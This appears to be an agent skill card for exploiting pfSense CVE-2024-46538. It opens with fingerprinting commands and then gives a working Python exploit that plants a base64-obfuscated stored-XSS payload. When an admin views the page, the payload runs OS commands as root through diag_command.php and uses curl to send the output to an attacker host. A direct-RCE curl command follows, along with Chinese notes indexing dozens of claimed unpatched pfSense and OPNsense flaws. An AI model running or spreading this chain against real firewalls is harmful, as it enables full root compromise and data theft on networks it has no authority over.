---
name: pfsense-xss-to-rce
description: "Use when pfSense found. Stored XSS to RCE chain."
---
# CVE-2024-46538 pfSense Stored XSS → RCE

## Overview
pfSense <= 2.7.2. Stored XSS in `interfaces_groups_edit.php` via the group description field. When an admin views the interface groups page, the XSS payload executes and can chain to `diag_command.php` for arbitrary OS command execution as root.

## Detection
```bash
# Fingerprint pfSense
curl -sI <TARGET> | grep -i 'server:\|pfsense'
curl -s <TARGET>/index.php | grep -o 'pfSense.*<'
# Login page at /index.php with pfSense branding
```

## 2026-10 0day 系列（CE 2.9.0-DEVELOPMENT，53 个仓库）

同一研究者在 2026-10-13/15 批量公开 53 个 pfSense 仓库：5 个直连 RCE（IPsec login_banner、OpenVPN wizard CRLF、QinQ parent-if、limiter、CARP VHID）+ 13 个 WebUI 字段注入 RCE（timezone php.ini、L2TP RADIUS mpd.conf、PPPoE crontab、sshguard THRESHOLD、Unbound ACL/queue-timeout、OpenVPN connect eval/learn-address CN、wireless clone ifconfig 等）+ 一批 config injection / 文件读写 / XSS / SQLi（voucher_expire）。另有 9 个 pfSense Plus MIM API toolkit 问题：单 controller JWT 即 fleet token、`GET export-key` 与 `/services/acme` 直出私钥、ACB userkey capability URL、Snort `{file}` decode-then-join、示例 `verify_ssl=False`。

**全量清单（只读索引，含每仓库一句话原语）**：`1day-nuclei-kit/references/abraxas-0day-index-2026-10.md` 的 pfSense 段。

注意：全部为**未分配 CVE** 的作者自研 0day，CE 2.9.0-DEVELOPMENT 是作者测试版本，不等于官方受影响范围；利用链/前置条件看仓库 README。本卡只做指纹命中后的候选定位与只读验证。

## OPNsense 同族（7 个，26.7.6）

同一批还有 7 个 OPNsense 仓库：tunables loader 配置行注入、WLAN WPA identity 行注入、NTP GPS fudge、captive lastseen 漫游绕过、factory lockout IP、UidField uid 0、自定义固件镜像 sed 跳过 pkg 指纹。清单见 `1day-nuclei-kit/references/abraxas-0day-index-2026-10.md` 的 OPNsense 段。

## Exploitation

### Step 1: Inject XSS payload (requires low-priv auth)
```python
import requests

TARGET = '<TARGET>'
s = requests.Session()
s.verify = False

# Login (need at least interface-group edit permission)
s.post(f'{TARGET}/index.php', data={
    '__csrf_magic': '<CSRF_TOKEN>',
    'usernamefld': '<USERNAME>',
    'passwordfld': '<PASSWORD>',
    'login': 'Sign In'
})

# XSS payload that chains to RCE via diag_command.php
js_payload = '''
fetch('/diag_command.php').then(r=>r.text()).then(h=>{
  let csrf=h.match(/__csrf_magic.*?value="([^"]+)"/)[1];
  fetch('/diag_command.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},
  body:'__csrf_magic='+csrf+'&txtCommand=id|curl+<LHOST>:<LPORT>/$(id|base64)&submit=EXEC'})
})'''.replace('\n','').strip()

import base64
b64 = base64.b64encode(js_payload.encode()).decode()
xss = f'<img src=x onerror="eval(atob(\'{b64}\'))">'

# Create/edit interface group with XSS in description
s.post(f'{TARGET}/interfaces_groups_edit.php', data={
    '__csrf_magic': '<CSRF>',
    'ifname': 'pwn',
    'descr': xss,
    'members[]': 'em0',
    'save': 'Save'
})
```

### Step 2: Wait for admin to view interface groups page
When admin visits `/interfaces_groups.php`, XSS fires → `diag_command.php` executes OS commands as root.

### Direct RCE (if admin creds available)
```bash
# Skip XSS, go straight to command exec
curl -s -b cookies.txt '<TARGET>/diag_command.php' \
  -d '__csrf_magic=<CSRF>&txtCommand=id&submit=EXEC'
```

## Pitfalls
- pfSense runs as root — any command exec = full system compromise
- CSRF tokens required on every POST
- XSS payload length limited by database column — keep it short (use base64+eval)
- `diag_command.php` only accessible to admin role
- Source: EQSTLab/CVE-2024-46538